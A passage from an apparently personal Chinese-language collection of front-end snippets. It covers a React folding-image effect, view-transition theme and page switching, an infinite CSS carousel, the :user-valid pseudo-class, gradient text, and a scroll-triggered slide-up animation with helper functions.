        {/* This image is new ⤸ */}
        <img
          src={src}
          alt="a neon Chinese alley"
          style={{
            width,
            height,
          }}
        />
      </div>

      {/* Bottom half */}
      <div
        style={{
          ...sharedStyles,

          // Only the bottom half gets a bg-image
          backgroundSize: `${width}px ${height}px`,
          backgroundImage: `url(${src})`,

          // Shift our background up to
          // make it contiguous with the
          // top half:
          backgroundPosition: `0px -100%`,

          // Apply the folding rotation:
          transform: `rotateX(${foldAngle}deg)`,
          transformOrigin: 'center top',

          // This optional prop can improve
          // performance, by letting the
          // browser optimize it:
          willChange: 'transform',
        }}
      />

      {/* Slider control */}
      <br />
      <label htmlFor="slider">Fold ratio:</label>
      <input
        id="slider"
        type="range"
        min={0}
        max={180}
        value={foldAngle}
        onChange={ev =>
          setFoldAngle(ev.target.value)
        }
        style={{ width }}
      />
    </div>
  );
};

render(
  <Foldable
    width={200}
    height={300}
    src={src}
  />
);
```

### [主题切换效果](https://juejin.cn/post/7207810396420325413?searchId=202501060958263E6A510CA320CE776C02)

**document.startViewTransition** 方法 实现丝滑切换主题

注意edge/chrome版本至少为111

![transitionAnimation.gif](https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/0039c7e7f6434e2aa54aca8fbfcb914e~tplv-k3u1fbpfcp-zoom-in-crop-mark:1512:0:0:0.awebp?)



### [无限的滚动旋转木马动画](https://codepen.io/wyf195075595/pen/MYWYpVm)

CSS创建一个无限的滚动旋转木马动画，并在悬停效果上停下来

```html
<style>
  .carousel {
    margin: 0 auto;
    padding: 20px 0;
    max-width: 700px;
    overflow: hidden;
    display: flex;
  }

  .card {
    width: 100%;
    color: white;
    border-radius: 24px;
    box-shadow: rgba(0, 0, 0, 10%) 5px 5px 20px 0;
    padding: 20px;
    font-size: xx-large;
    justify-content: center;
    align-items: center;
    min-height: 200px;

    &:nth-child(1) {
      background: #7958ff;
    }

    &:nth-child(2) {
      background: #5d34f2;
    }

    &:nth-child(3) {
      background: #4300da;
    }
  }

  @keyframes scrolling {
    0% {
      transform: translateX(0);
    }
    100% {
      transform: translateX(-100%);
    }
  }
  .carousel {
    /* ... */
    > * {
      flex: 0 0 100%;
    }
      
    &:hover .group {
      animation-play-state: paused;
    }
  }

  /* Group the cards for better structure. */
  .group {
    display: flex;
    gap: 20px;
    /* Add padding to the right to create a gap between the last and first card. */
    padding-right: 20px;
      
    /* ... */
    will-change: transform; /* We should be nice to the browser - let it know what we're going to animate. */
    animation: scrolling 10s linear infinite;
  }
</style>
<div class="carousel">
  <div class="group">
    <div class="card">A</div>
    <div class="card">B</div>
    <div class="card">C</div>
  </div>
  <!-- Add `aria-hidden` to hide the duplicated cards from screen readers. -->
  <div aria-hidden class="group">
    <div class="card">A</div>
    <div class="card">B</div>
    <div class="card">C</div>
  </div>
</div>
```

### css 实现单页面切换过渡效果

![Animated demo - clicking the tabs to swap between Latest, Trending and Hacker News Hits rearranges the list of posts in a smooth animation, then navigating to a post causes its title to enlarge and move to the top while the rest of the article loads in.](https://static.simonwillison.net/static/2025/llms-demo.gif)

Watching the network panel in my browser, most of these pages are 17-20KB gzipped (~45KB after they've decompressed). No wonder it feels so snappy.
查看浏览器中的网络面板，这些页面中的大多数都是 17-20KB 的 gzip 压缩的（解压缩后为 ~45KB）。难怪感觉如此活泼。

I poked around [in Jim's CSS](https://blog.jim-nielsen.com/styles.css) and found this relevant code:
我在 [Jim 的 CSS 中](https://blog.jim-nielsen.com/styles.css)四处寻找并找到了以下相关代码：

```css
@view-transition {
  navigation: auto;
}

.posts-nav a[aria-current="page"]:not(:last-child):after {
  border-color: var(--c-text);
  view-transition-name: posts-nav;
}

/* Old stuff going out */
::view-transition-old(posts-nav) {
  animation: fade 0.2s linear forwards;
  /* https://jakearchibald.com/2024/view-transitions-handling-aspect-ratio-changes/ */
  height: 100%;
}

/* New stuff coming in */
::view-transition-new(posts-nav) {
  animation: fade 0.3s linear reverse;
  height: 100%;
}

@keyframes fade {
  from {
    opacity: 1;
  }
  to {
    opacity: 0;
  }
}
```

### 用户输入框校验伪类

`:user-valid` 伪类是 `:valid` 的更新版本，它使表单验证方式更加用户友好。**只有在用户与输入**交互（如键入或选择某些内容） *并且*他们的输入满足所有验证要求后，它才会启动。

```css
input:user-valid {
  border: 2px solid green;
  background: #f0fff0;
}
```

### [CSS 和 SVG 模拟液态玻璃](https://kube.io/blog/liquid-glass-css-svg/)（英文）

![img](https://cdn.beekka.com/blogimg/asset/202509/bg2025090912.webp)

本文介绍只使用 CSS 和 SVG 文件来模拟苹果的液态玻璃效果。大家可以先看结尾的效果展示，非常惊艳（只限于 Chrome 浏览器）。

### css 文字渐变效果

设置文本渐变背景，再将文本颜色设置为透明，最后设置 背景裁剪效果为 文本

```css
background: linear-gradient(226.67deg, rgba(0, 132, 255, 1) 0%, rgba(2, 225, 255, 1) 100%);
background-clip: text;
-webkit-background-clip: text;
color: transparent;
```



### 页面内容淡入弹出效果

进入页面时进入视图的页面内容会 淡入弹出的效果

```css
/* 动画类：往上蹦的效果 */
.slide-up {
    transform: translateY(50px);
    opacity: 0;
    transition: .8s ease transform, .8s ease opacity;
}
.slide-up.active {
    opacity: 1;
    transform: translateY(0);
}
```

给页面要施加效果得元素添加默认 slide-up 类，再通过 js控制，当页面元素进入视图就添加 active 类,下边是工具函数

```js
// 1. 检测元素是否在视口内（可自定义“进入多少时触发”，这里是元素顶部进入视口底部100px时）
export function isInViewport(el) {
    const rect = el.getBoundingClientRect();
    const viewportHeight = window.innerHeight || document.documentElement.clientHeight;
    // 条件：元素顶部 < 视口底部 + 100px（提前100px触发），且元素底部 > 视口顶部
    return rect.top < viewportHeight + 100 && rect.bottom > 0;
}

// 2. 处理滚动事件：给进入视口的元素加active类
export function handleScroll() {
    const elements = document.querySelectorAll('.slide-up');
    elements.forEach(el => {
        if (isInViewport(el) && !el.classList.contains('active')) {
            setTimeout(() => {
                el.classList.add('active'); // 触发动画
            }, 100);
        }
        // 可选：滚动离开时移除类（实现“反复触发”）
        // else if (!isInViewport(el) && el.classList.contains('active')) {
        //   el.classList.remove('active');
        // }
    });
}


// 简单的节流函数（优化性能）
export function throttle(fn, delay) {
    let lastTime = 0;
    return function() {
        const now = Date.now();
        if (now - lastTime > delay) {
        fn.apply(this, arguments);
        lastTime = now;
        }
    };
}

```

具体页面使用

```js
onMounted(() => {
    // 3. 初始化：页面加载时先检测一次（避免顶部元素未触发）
    // window.addEventListener('load', handleScroll);
    handleScroll();
    // 4. 监听滚动事件（用throttle优化性能，避免频繁触发）
    window.addEventListener('scroll', throttle(handleScroll, 100));
})
```

